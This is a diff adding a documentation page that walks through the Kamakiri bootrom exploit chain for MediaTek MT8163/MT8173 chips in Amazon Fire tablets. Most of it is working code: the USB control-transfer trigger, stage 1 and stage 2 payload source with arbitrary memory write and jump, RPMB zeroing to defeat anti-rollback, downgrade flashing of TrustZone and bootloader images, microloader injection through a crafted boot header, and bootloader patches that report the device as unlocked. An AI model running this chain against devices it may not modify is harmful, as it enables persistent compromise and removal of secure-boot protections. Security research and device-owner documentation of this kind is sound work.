@@ -1,0 +1,633 @@
+---
+title: How Kamakiri Works
+description: Deep dive into the complete exploit chain, bootrom vulnerabilities, and payload execution stages
+---
+
+## Overview
+
+Kamakiri is a multi-stage bootrom exploit for MediaTek devices that achieves arbitrary code execution through a USB control transfer vulnerability in the BootROM, then progressively gains deeper system access through custom payloads. The exploit chain consists of:
+
+1. **BootROM exploitation** - Triggering a vulnerability via USB control transfer
+2. **Stage 1 payload** - Initial code execution in BootROM context
+3. **Stage 2 payload** - Full device access with eMMC read/write capabilities
+4. **LK payload** - Persistent bootloader hook for ongoing modifications
+5. **Microloader** - Automatic payload loading on every boot
+
+<Note>
+This exploit targets MediaTek MT8163/MT8173 chipsets commonly found in Amazon Fire tablets (codename "mantis").
+</Note>
+
+## The Exploit Chain
+
+<Steps>
+
+### Step 1: Handshake and Setup
+
+The exploit begins by establishing communication with the device in BootROM mode using MediaTek's proprietary protocol:
+
+```python
+def handshake(self):
+    # look for start byte
+    while True:
+        c = self._writeb(b'\xa0')
+        if c == b'\x5f':
+            self.dev.flushInput()
+            self.dev.flushOutput()
+            break
+        self.dev.flushInput()
+        self.dev.flushOutput()
+
+    # complete sequence
+    self.check(self._writeb(b'\x0a'), b'\xf5')
+    self.check(self._writeb(b'\x50'), b'\xaf')
+    self.check(self._writeb(b'\x05'), b'\xfa')
+```
+
+The handshake establishes a synchronized serial connection over USB with the MediaTek BootROM at 115200 baud.
+
+**Key operations:**
+- Disable hardware watchdog timer at `0x10007000`
+- Write to watchdog register `0x10007050` to set up exploit conditions
+- Read bootrom memory to verify device state
+
+```python
+dev.write32(0x10007000, 0x22000000)  # Disable watchdog
+dev.write32(0x10007050, [0xA1000])   # Setup exploit condition
+```
+
+### Step 2: Trigger the Vulnerability
+
+The core vulnerability is triggered using a USB control transfer with specific parameters:
+
+```python
+def attempt2(d):
+    d.write(b"\xE0")              # Send DA (Download Agent) command
+    result = d.read(1)
+    d.write(p32(0xA00))           # Specify payload size (2560 bytes)
+    result = d.read(4)
+    
+    payload = load_payload_file("../brom-payload/stage1/stage1.bin")
+    
+    if len(payload) >= 0xA00:
+        raise RuntimeError("payload too large")
+    
+    d.write(payload)              # Send malicious payload
+```
+
+After the payload is staged, a crafted USB control transfer triggers the vulnerability:
+
+```python
+try:
+    udev.ctrl_transfer(0xA1, 0, 0, 10, 0)
+except usb.core.USBError as e:
+    print(e)
+```
+
+<Warning>
+**Vulnerability Details:**
+- The BootROM's USB handler contains a buffer overflow or memory corruption bug
+- The control transfer with specific parameters (`bmRequestType=0xA1`, interface `10`) triggers execution
+- Code execution begins at the injected Stage 1 payload address
+</Warning>
+
+### Step 3: Stage 1 Payload Execution
+
+Stage 1 executes in BootROM context with limited memory (< 2560 bytes). It provides a minimal command protocol:
+
+**Source: `brom-payload/stage1.c`**
+
+```c
+int main() {
+    print("Entered 1ST stage payload\n");
+    print("Copyright xyz, k4y0z 2019\n");
+
+    // Prevent USB timeout
+    send_usb_response(0,0,1);
+
+    print("Entering command loop\n");
+    send_dword(0xA1A2A3A4);  // Magic signature to confirm execution
+
+    while (1) {
+        uint32_t magic = recv_dword();
+        if (magic != 0xf00dd00d) {
+            break;
+        }
+        uint32_t cmd = recv_dword();
+        switch (cmd) {
+        case 0x4000: {  // Write memory
+            uint32_t address = recv_dword();
+            uint32_t size = recv_dword();
+            if(recv_data(address, size, 0) == 0) {
+                send_dword(0xD0D0D0D0);
+            }
+            break;
+        }
+        case 0x4001: {  // Jump to address
+            void (*jump_address)(void) = (void*) recv_dword();
+            jump_address();
+            break;
+        }
+        case 0x3000: {  // Reboot device
+            volatile uint32_t *reg = (volatile uint32_t *)0x10007000;
+            reg[8/4] = 0x1971;
+            reg[0/4] = 0x22000014;
+            reg[0x14/4] = 0x1209;
+            while (1) { }
+        }
+        case 0x3001: {  // Kick watchdog
+            volatile uint32_t *reg = (volatile uint32_t *)0x10007000;
+            reg[8/4] = 0x1971;
+            break;
+        }
+        }
+    }
+}
+```
+
+**Stage 1 Capabilities:**
+- Write arbitrary data to any memory address (`0x4000`)
+- Jump to arbitrary code locations (`0x4001`)
+- Reboot the device (`0x3000`)
+- Keep watchdog timer alive (`0x3001`)
+
+**BootROM Function Reuse:**
+
+Stage 1 leverages existing BootROM functions through hardcoded addresses:
+
+```c
+void (*send_usb_response)(int, int, int) = (void*)0x55bb;
+int (*send_dword)() = (void*)0xBE09;
+int (*recv_dword)() = (void*)0xBDD5;
+int (*send_data)() = (void*)0xBED1;
+int (*recv_data)() = (void*)0xBE4B;
+```
+
+These are existing BootROM functions repurposed for the exploit's command protocol.
+
+### Step 4: Load and Execute Stage 2
+
+The Python exploit uses Stage 1's memory write capability to load Stage 2:
+
+```python
+log("Load 2nd stage payload")
+stage2 = load_payload_file("../brom-payload/stage2/stage2.bin")
+
+log("Send 2nd stage payload")
+d.write(p32(0xf00dd00d))  # Magic
+d.write(p32(0x4000))      # Write command
+d.write(p32(0x201000))    # Destination address
+d.write(p32(len(stage2))) # Payload length
+d.write(stage2)           # Payload data
+
+code = d.read(4)
+if code != b"\xd0\xd0\xd0\xd0":
+    raise RuntimeError("device failure")
+
+# Execute Stage 2
+d.write(p32(0xf00dd00d))  # Magic
+d.write(p32(0x4001))      # Jump command
+d.write(p32(0x201000))    # Stage 2 entry point
+```
+
+### Step 5: Stage 2 Payload - Full Device Access
+
+Stage 2 initializes the eMMC controller and provides comprehensive device access:
+
+**Source: `brom-payload/stage2.c`**
+
+```c
+int main() {
+    printf("Entered 2ND stage payload\n");
+    printf("Copyright xyz, k4y0z 2019\n");
+
+    struct msdc_host host = { 0 };
+    host.ocr_avail = MSDC_OCR_AVAIL;
+
+    mmc_init(&host);  // Initialize eMMC controller
+
+    command_loop(&host);
+}
+```
+
+The command loop provides extensive functionality:
+
+**Source: `brom-payload/payload_common.c`**
+
+<CodeGroup>
+
+```c eMMC Read/Write
+case 0x1000: {  // Read eMMC block
+    uint32_t block = recv_dword();
+    printf("Read block 0x%08X\n", block);
+    if (mmc_read(host, block, buf) != 0) {
+        printf("Read error!\n");
+    } else {
+        send_data(buf, 0x200);  // Send 512 bytes
+    }
+    break;
+}
+
+case 0x1001: {  // Write eMMC block
+    uint32_t block = recv_dword();
+    printf("Write block 0x%08X ", block);
+    recv_data(buf, 0x200, 0);
+    if (mmc_write(host, block, buf) != 0) {
+        printf("Write error!\n");
+    } else {
+        send_dword(0xD0D0D0D0);
+    }
+    break;
+}
+
+case 0x1002: {  // Switch eMMC partition
+    uint32_t part = recv_dword();
+    printf("Switch to partition %d => ", part);
+    mmc_set_part(host, part);
+    break;
+}
+```
+
+```c RPMB Operations
+case 0x2000: {  // Read RPMB (Replay Protected Memory Block)
+    printf("Read rpmb\n");
+    mmc_rpmb_read(host, buf);
+    send_data(buf, 0x100);
+    break;
+}
+
+case 0x2001: {  // Write RPMB
+    printf("Write rpmb\n");
+    recv_data(buf, 0x100, 0);
+    mmc_rpmb_write(host, buf);
+    break;
+}
+```
+
+```c Memory and Device Info
+case 0x5000: {  // Read arbitrary memory
+    uint32_t address = recv_dword();
+    uint32_t size = recv_dword();
+    printf("Read %d Bytes from address 0x%08X\n", size, address);
+    send_data((char*)address, size);
+    break;
+}
+
+case 0x7000: {  // Read IDME (ID Management Engine)
+    char field_name[16] = { 0 };
+    recv_data(field_name, 16, 0);
+    printf("Read %s from IDME\n", field_name);
+    // Searches eMMC for IDME field and returns data
+    break;
+}
+```
+
+</CodeGroup>
+
+**Python Interface:**
+
+The exploit provides high-level Python wrappers for these commands:
+
+```python
+# Read eMMC block
+data = dev.emmc_read(block_index)
+
+# Write eMMC block
+dev.emmc_write(block_index, data)
+
+# Switch partition (0=boot0, 8=user)
+dev.emmc_switch(partition)
+
+# Zero out RPMB to enable downgrade
+dev.rpmb_write(b"\x00" * 0x100)
+
+# Read device identifier
+device_id = dev.idme_read(b"device_type_id")
+```
+
+### Step 6: Flash Vulnerable Components
+
+With full eMMC access, the exploit downgrades security-critical partitions:
+
+```python
+# 1. Zero RPMB to bypass anti-rollback
+dev.rpmb_write(b"\x00" * 0x100)
+
+# 2. Downgrade TrustZone
+flash_binary(dev, "../bin/tz.img", gpt["tee1"][0], gpt["tee1"][1] * 0x200)
+
+# 3. Downgrade LK (Little Kernel bootloader)
+flash_binary(dev, "../bin/lk.bin", gpt["lk"][0], gpt["lk"][1] * 0x200)
+
+# 4. Install LK payload to boot0 partition
+flash_binary(dev, "../lk-payload/build/payload.bin", 1024)
+
+# 5. Install microloader in boot partition
+flash_binary(dev, "../bin/microloader.bin", gpt["boot"][0], 2 * 0x200)
+
+# 6. Flash vulnerable preloader (if needed)
+flash_binary(dev, "../bin/preloader.img", 0)
+```
+
+</Steps>
+
+## Persistent Hook: LK Payload
+
+The LK (Little Kernel) payload provides persistent control over the boot process. It's loaded by the microloader on every boot.
+
+### Microloader Boot Flow
+
+The microloader is injected into the boot partition using a crafted Android boot image header:
+
+**Source: `microloader/inject_microloader.py`**
+
+```python
+# Craft fake Android boot header
+hdr = b"ANDROID!"  # magic
+hdr += struct.pack("<II", inject_sz, inject_addr - crafted_hdr_sz + page_size)
+hdr += struct.pack("<IIIIIIII", 0, 0, 0, 0, 0, page_size, 0, 0)
+```
+
+The header exploits LK's boot image parser to execute injected code:
+
+1. **ROP chain** - Return-oriented programming to bypass code signing
+2. **Cache flush** - Ensures injected code is visible to CPU
+3. **Payload load** - Reads LK payload from boot0 partition at offset `0x80000`
+
+**Source: `microloader/main.c`**
+
+```c
+int main() {
+    puts("microloader");
+
+    struct device_t *dev = (void*)get_device();
+
+    // Read payload from boot0 partition
+    uint32_t *dst = (void*)PAYLOAD_DST;  // 0x41000000
+    size_t ret = dev->read(dev, PAYLOAD_SRC, dst, PAYLOAD_SIZE, BOOT0_PART);
+
+    // Try backup location if primary fails
+    if(*dst != 0xe3a0d442) {
+        puts("Try backup");
+        size_t ret = dev->read(dev, BACKUP_SRC, dst, PAYLOAD_SIZE, BOOT0_PART);
+    }
+
+    cache_clean(dst, PAYLOAD_SIZE);
+
+    // Jump to the payload
+    void (*jump)(void) = (void*)dst;
+    puts("Jump");
+    jump();
+}
+```
+
+### LK Payload Hooks
+
+The LK payload hooks critical bootloader functions to maintain control:
+
+**Source: `lk-payload/main.c`**
+
+<CodeGroup>
+
+```c Boot Image Hook
+size_t read_func(struct device_t *dev, uint64_t block_off, 
+                 void *dst, uint32_t sz, uint32_t part) {
+    printf("read_func hook\n");
+    int ret = 0;
+    
+    // Hook boot/recovery partition reads
+    if (block_off == g_boot * 0x200 || block_off == g_recovery * 0x200) {
+        printf("demangle boot image - from 0x%08X\n", 
+               __builtin_return_address(0));
+
+        // Redirect to recovery for bootmenu
+        if (block_off == g_boot * 0x200 && *y_cable == 1 && 
+            !boot_system && *boot_reason == 0) {
+            printf("Boot into recovery to display bootmenu");
+            block_off = g_recovery * 0x200;
+        }
+        
+        // Skip first 0x400 bytes (microloader header)
+        if (sz < 0x400) {
+            ret = original_read(dev, block_off + 0x400, dst, sz, part);
+        } else {
+            void *second_copy = (char*)dst + 0x400;
+            ret = original_read(dev, block_off, dst, sz, part);
+            memcpy(dst, second_copy, 0x400);
+            memset(second_copy, 0, 0x400);
+        }
+    } else {
+        ret = original_read(dev, block_off, dst, sz, part);
+    }
+    return ret;
+}
+```
+
+```c Unlock Device
+// Patch: Device is unlocked
+patch = (void*)0x41E01D34;
+*patch++ = 0x2001; // movs r0, #1
+*patch = 0x4770;   // bx lr
+
+// Patch: Enable all fastboot commands
+patch = (void*)0x41E01EA0;
+*patch++ = 0x2000; // movs r0, #0
+*patch = 0x4770;   // bx lr
+
+// Hook bootimg read function
+uint32_t *patch32;
+original_read = (void*)dev->read;
+patch32 = (void*)&dev->read;
+*patch32 = (uint32_t)read_func;
+```
+
+```c Boot Mode Control
+// Parse MISC partition for boot flags
+dev->read(dev, g_misc * 0x200, bootloader_msg, 0x20, USER_PART);
+
+if(strncmp(bootloader_msg, "boot-amonet", 11) == 0) {
+    fastboot = 1;
+    memset(bootloader_msg, 0, 0x10);
+    dev->write(dev, bootloader_msg, g_misc * 0x200, 0x10, USER_PART);
+}
+else if(strncmp(bootloader_msg, "FASTBOOT_PLEASE", 15) == 0) {
+    fastboot = 1;
+}
+else if(strncmp(bootloader_msg, "boot-recovery", 13) == 0) {
+    *g_boot_mode = 2;  // Recovery mode
+    memset(bootloader_msg, 0, 0x10);
+    dev->write(dev, bootloader_msg, g_misc * 0x200, 0x10, USER_PART);
+}
+```
+
+</CodeGroup>
+
+**Key Features:**
+
+1. **Boot Image Demangling** - Removes microloader header when LK loads boot/recovery
+2. **Device Unlock** - Patches LK to report device as unlocked
+3. **Fastboot Access** - Enables all fastboot commands
+4. **Boot Mode Control** - Reads MISC partition flags to control boot behavior
+5. **UART Enable** - Can force UART console enable via MISC flag
+
+### GPT Parsing
+
+The payload parses the GPT (GUID Partition Table) to locate critical partitions:
+
+```c
+static void parse_gpt() {
+    uint8_t raw[0x800] = { 0 };
+    struct device_t *dev = get_device();
+    dev->read(dev, 0x400, raw, sizeof(raw), USER_PART);
+    
+    for (size_t i = 0; i < sizeof(raw) / 0x80; ++i) {
+        uint8_t *ptr = &raw[i * 0x80];
+        uint8_t *name = ptr + 0x38;
+        uint32_t start;
+        memcpy(&start, ptr + 0x20, 4);
+        
+        if (memcmp(name, "b\x00o\x00o\x00t\x00\x00\x00", 10) == 0) {
+            printf("found boot at 0x%08X\n", start);
+            g_boot = start;
+        }
+        // ... parse recovery, lk, misc partitions
+    }
+}
+```
+
+## Security Bypasses
+
+### RPMB Rollback Protection
+
+The RPMB (Replay Protected Memory Block) is a secure eMMC partition that prevents firmware downgrade. Kamakiri bypasses this by:
+
+1. Reading current RPMB state
+2. Zeroing the entire RPMB partition
+3. This resets the rollback counter, allowing downgrade
+
+```python
+log("Downgrade rpmb")
+dev.rpmb_write(b"\x00" * 0x100)
+log("Recheck rpmb")
+rpmb = dev.rpmb_read()
+if rpmb != b"\x00" * 0x100:
+    dev.reboot()
+    raise RuntimeError("downgrade failure, giving up")
+```
+
+<Warning>
+**Security Impact:** Zeroing RPMB bypasses Android Verified Boot anti-rollback protection, allowing installation of vulnerable firmware versions.
+</Warning>
+
+### Secure Boot Bypass
+
+By downgrading to vulnerable firmware versions and installing the persistent hook:
+
+1. **Preloader** - Vulnerable version allows BootROM exploit
+2. **TrustZone** - Downgraded version has weaker signature verification
+3. **LK** - Patched at runtime to report device as unlocked
+4. **Boot Images** - Modified via microloader injection
+
+### Signature Verification
+
+The microloader bypasses boot image signature verification through:
+
+1. **ROP Exploitation** - Uses return-oriented programming in LK's address space
+2. **Cache Manipulation** - Flushes instruction cache to ensure malicious code executes
+3. **Function Hooking** - Redirects device read function to strip microloader header
+
+## Communication Protocol
+
+### Stage 1 & 2 Protocol
+
+All commands use a simple TLV (Type-Length-Value) format:
+
+```python
+# Command format:
+# [4 bytes] 0xf00dd00d - Magic
+# [4 bytes] Command ID
+# [variable] Command-specific data
+
+def emmc_read(self, idx):
+    self.dev.write(p32_be(0xf00dd00d))  # Magic
+    self.dev.write(p32_be(0x1000))      # Command: Read
+    self.dev.write(p32_be(idx))         # Block index
+    data = self.dev.read(0x200)         # Receive 512 bytes
+    return data
+```
+
+### BootROM Protocol
+
+The BootROM uses MediaTek's proprietary protocol for memory access:
+
+```python
+def read32(self, addr, size=1):
+    self.dev.write(b'\xd1')                    # Read command
+    self.check(self.dev.read(1), b'\xd1')      # Echo
+    
+    self.dev.write(struct.pack('>I', addr))    # Address
+    self.check_int(self.dev.read(4), addr)     # Echo
+    
+    self.dev.write(struct.pack('>I', size))    # Size
+    self.check_int(self.dev.read(4), size)     # Echo
+    
+    self.check(self.dev.read(2), b'\x00\x00')  # Status
+    
+    for _ in range(size):
+        data = struct.unpack('>I', self.dev.read(4))[0]
+        result.append(data)
+    
+    self.check(self.dev.read(2), b'\x00\x00')  # Status
+    return result
+```
+
+<Note>
+All multi-byte values are **big-endian** in the BootROM protocol, but **little-endian** in the payload protocol.
+</Note>
+
+## Memory Layout
+
+### BootROM Stage
+
+| Address | Size | Description |
+|---------|------|-------------|
+| `0x10007000` | - | Watchdog timer base |
+| `0x10007050` | - | Exploit trigger register |
+| `< 0xA00` | 2560 bytes | Stage 1 payload max size |
+| `0x201000` | ~512KB | Stage 2 payload location |
+
+### LK Stage
+
+| Address | Size | Description |
+|---------|------|-------------|
+| `0x41E00000` | 1MB | LK base address |
+| `0x41E01D34` | - | Device unlock check |
+| `0x41E01EA0` | - | Fastboot command verification |
+| `0x41E22ED1` | - | get_device() function |
+| `0x41E5544C` | - | g_boot_mode variable |
+| `0x41000000` | 512KB | LK payload destination |
+
+### eMMC Layout
+
+| Partition | Offset | Size | Description |
+|-----------|--------|------|-------------|
+| boot0 | `0x0` | - | Preloader (first boot partition) |
+| boot0 | `0x80000` | 512KB | LK payload primary location |
+| boot0 | `0x200000` | 512KB | LK payload backup location |
+| boot | GPT | - | Linux kernel (microloader injected) |
+| recovery | GPT | - | Recovery kernel |
+| lk | GPT | - | Little Kernel bootloader |
+| tee1 | GPT | - | TrustZone image |
+| misc | GPT | - | Boot flags and configuration |
+
+## Summary
+
+The Kamakiri exploit chain demonstrates a complete system compromise:
+
+1. **Initial Access** - USB control transfer vulnerability in BootROM
+2. **Code Execution** - Stage 1 payload provides memory write primitive
+3. **Device Access** - Stage 2 initializes eMMC for full storage access
+4. **Security Bypass** - RPMB zeroing and firmware downgrade
+5. **Persistence** - Microloader + LK payload survive reboots
+6. **Complete Control** - Device unlocked, fastboot enabled, boot process controlled
+
+The exploit leverages hardware vulnerabilities, firmware downgrades, and sophisticated code injection techniques to achieve permanent device compromise through the boot chain.
